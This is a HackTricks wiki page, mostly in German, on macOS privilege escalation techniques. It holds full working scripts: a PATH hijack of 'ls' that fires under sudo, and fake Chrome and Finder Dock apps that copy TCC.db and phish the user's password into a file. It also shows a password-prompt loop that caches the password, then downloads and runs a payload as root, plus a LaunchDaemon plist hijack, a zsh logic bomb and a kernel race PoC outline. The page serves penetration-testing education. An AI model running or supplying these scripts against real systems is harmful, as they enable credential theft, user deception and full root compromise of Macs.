# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Wenn Sie hierher gekommen sind, um TCC privilege escalation zu suchen, gehen Sie zu:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Bitte beachten Sie, dass **die meisten Tricks zur privilege escalation, die Linux/Unix betreffen, sich auch auf MacOS-Maschinen auswirken werden.** Siehe:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Benutzerinteraktion

### Sudo Hijacking

Die Originalversion finden Sie im Beitrag: [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim sill execute when **running sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Beachte, dass ein Benutzer, der das Terminal benutzt, sehr wahrscheinlich **Homebrew installiert** hat. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.

### Dock Impersonation

Mit etwas **social engineering** könntest du zum Beispiel **impersonate Google Chrome** im Dock und tatsächlich dein eigenes **script** ausführen:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Einige Vorschläge:

- Prüfe im Dock, ob Chrome vorhanden ist, und entferne in diesem Fall diesen Eintrag und füge den gefälschten Chrome-Eintrag an derselben Position im Dock-Array hinzu.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Einige Vorschläge:

- Du **cannot remove Finder from the Dock**, daher, wenn du ihn dem Dock hinzufügen willst, könntest du den gefälschten Finder direkt neben dem echten platzieren. Dafür musst du **add the fake Finder entry at the beginning of the Dock array**.
- Eine andere Möglichkeit ist, ihn nicht ins Dock zu legen und ihn einfach zu öffnen; "Finder asking to control Finder" ist nicht so seltsam.
- Eine weitere Möglichkeit, um **escalate to root without asking** — also ohne ein hässliches Passwortfenster — besteht darin, Finder tatsächlich dazu zu bringen, nach dem Passwort zu fragen, um eine privilegierte Aktion auszuführen:
- Fordere Finder auf, eine neue **`sudo`**-Datei nach **`/etc/pam.d`** zu kopieren (die Passwortabfrage wird anzeigen, dass "Finder wants to copy sudo")
- Fordere Finder auf, ein neues **Authorization Plugin** zu kopieren (du könntest den Dateinamen kontrollieren, sodass die Passwortabfrage anzeigt, dass "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware nutzt häufig Benutzerinteraktion, um **capture a sudo-capable password** und es programmatisch wiederzuverwenden. Ein typischer Ablauf:

1. Den angemeldeten Benutzer mit `whoami` ermitteln.
2. **Loop password prompts** bis `dscl . -authonly "$user" "$pw"` Erfolg zurückgibt.
3. Die Anmeldeinformationen cachen (z. B. `/tmp/.pass`) und privilegierte Aktionen mit `sudo -S` ausführen (password über stdin).

Beispiel minimaler Ablauf:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Das gestohlene Passwort kann dann wiederverwendet werden, um **die Gatekeeper-Quarantäne mit `xattr -c` zu entfernen**, LaunchDaemons oder andere privilegierte Dateien zu kopieren und zusätzliche Stages nicht-interaktiv auszuführen.

## Neuere macOS-spezifische Vektoren (2023–2025)

### Veraltetes `AuthorizationExecuteWithPrivileges` weiterhin nutzbar

`AuthorizationExecuteWithPrivileges` wurde in 10.7 als veraltet markiert, funktioniert aber **weiterhin unter Sonoma/Sequoia**. Viele kommerzielle Updater rufen `/usr/libexec/security_authtrampoline` mit einem nicht vertrauenswürdigen Pfad auf. Wenn die Ziel-Binärdatei vom Benutzer beschreibbar ist, können Sie einen Trojaner platzieren und die legitime Eingabeaufforderung ausnutzen:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombiniere das mit den **masquerading tricks above**, um einen glaubwürdigen Passwortdialog darzustellen.


### Privileged helper / XPC triage

Viele moderne Drittanbieter-macos privescs folgen dem gleichen Muster: ein **root LaunchDaemon** stellt einen **Mach/XPC service** aus **`/Library/PrivilegedHelperTools`** bereit, dann validiert der Helper entweder **den Client nicht**, validiert ihn **zu spät** (PID race), oder exponiert eine **root-Methode**, die einen **benutzerkontrollierten Pfad/Skript** verarbeitet. Diese Fehlerklasse steckt hinter vielen kürzlichen Helper-Bugs in VPN-Clients, Game-Launchern und Updaters.

Schnelle Triage-Checkliste:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Achte besonders auf Hilfsprozesse, die:

- weiterhin Anfragen annehmen **nach der Deinstallation**, weil der Job in `launchd` geladen blieb
- Skripte ausführen oder Konfiguration aus **`/Applications/...`** oder anderen Pfaden lesen, die von Nicht-Root-Benutzern beschreibbar sind
- auf **PID-based** oder **bundle-id-only** Peer-Validierung angewiesen sind, die für Race-Conditions anfällig sein kann

Für mehr Details zu Autorisierungs-Bugs von Hilfsprozessen siehe [this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit: Vererbung der Skript-Umgebung (CVE-2024-27822)

Bis Apple das in **Sonoma 14.5**, **Ventura 13.6.7** und **Monterey 12.7.5** behoben hat, konnten von Benutzern initiierte Installationen über **`Installer.app`** / **`PackageKit.framework`** **PKG scripts as root inside the current user's environment** ausführen. Das bedeutet, ein Paket, das **`#!/bin/zsh`** verwendet, würde die `~/.zshenv` des Angreifers laden und sie als **root** ausführen, wenn das Opfer das Paket installierte.

Das ist besonders interessant als **logic bomb**: Man benötigt nur eine Fuß in dem Benutzerkonto und eine beschreibbare Shell-Startdatei; dann wartet man, bis ein verwundbarer **zsh-based** Installer vom Benutzer ausgeführt wird. Dies gilt **nicht** allgemein für **MDM/Munki**-Bereitstellungen, da diese innerhalb der Umgebung des root-Benutzers laufen.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Wenn Sie tiefer in installer-spezifischen Missbrauch eintauchen möchten, schauen Sie sich auch [diese Seite](macos-files-folders-and-binaries/macos-installers-abuse.md) an.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Wenn eine LaunchDaemon plist oder ihr `ProgramArguments`-Ziel **vom Benutzer schreibbar** ist, können Sie Privilegien erhöhen, indem Sie sie austauschen und dann launchd zum Neuladen zwingen:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Das spiegelt das für **CVE-2025-24085** veröffentlichte Exploit-Muster wider, bei dem eine writable plist missbraucht wurde, um attacker code als root auszuführen.

### XNU SMR credential race (CVE-2025-24118)

Ein **race in `kauth_cred_proc_update`** ermöglicht einem lokalen Angreifer, den read-only credential pointer (`proc_ro.p_ucred`) zu korrumpieren, indem `setgid()`/`getgid()`-Schleifen über Threads gegeneinander geraced werden, bis ein torn `memcpy` auftritt. Erfolgreiche Korrumpierung führt zu **uid 0** und Zugriff auf kernel memory. Minimale PoC-Struktur:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Kombiniert mit heap grooming, um kontrollierte Daten dorthin zu platzieren, wo der Pointer erneut gelesen wird. Auf verwundbaren Builds ist dies ein zuverlässiger **local kernel privesc** ohne SIP-Bypass-Anforderungen.

### SIP-Bypass über Migration assistant ("Migraine", CVE-2023-32369)

Wenn du bereits root hast, verhindert SIP trotzdem Schreibvorgänge an Systemorten. Der **Migraine**-Bug missbraucht das Migration Assistant Entitlement `com.apple.rootless.install.heritable`, um einen Child-Prozess zu starten, der den SIP-Bypass erbt und geschützte Pfade überschreibt (z. B. `/System/Library/LaunchDaemons`). Die Kette:

1. Erlange root auf einem laufenden System.
2. Trigger `systemmigrationd` mit manipuliertem Zustand, um ein vom Angreifer kontrolliertes Binary auszuführen.
3. Nutze das vererbte Entitlement, um SIP-geschützte Dateien zu patchen, wodurch Persistenz auch nach Reboot erreicht wird.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Mehrere Apple-Daemons akzeptieren **NSPredicate**-Objekte über XPC und validieren nur das Feld `expressionType`, das vom Angreifer kontrollierbar ist. Durch das Erstellen eines Predicates, das beliebige Selector auswertet, kannst du **code execution in root/system XPC services** (z. B. `coreduetd`, `contextstored`) erreichen. In Kombination mit einer initialen App-Sandbox-Escape gewährt dies **privilege escalation without user prompts**. Suche nach XPC-Endpunkten, die Predicates deserialisieren und keinen robusten Visitor haben.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Jeder Benutzer** (auch unprivilegierte) kann einen Time Machine snapshot erstellen und einhängen und **access ALL the files** dieses Snapshots erhalten.\
Das **einzige Privileg**, das benötigt wird, ist, dass die verwendete Anwendung (z. B. `Terminal`) **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`) hat, welches von einem Admin gewährt werden muss.

<details>
<summary>Time Machine-Snapshot einhängen</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Eine detailliertere Erklärung finden Sie [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Sensible Informationen

Dies kann nützlich sein, um Privilegien zu eskalieren:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referenzen

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
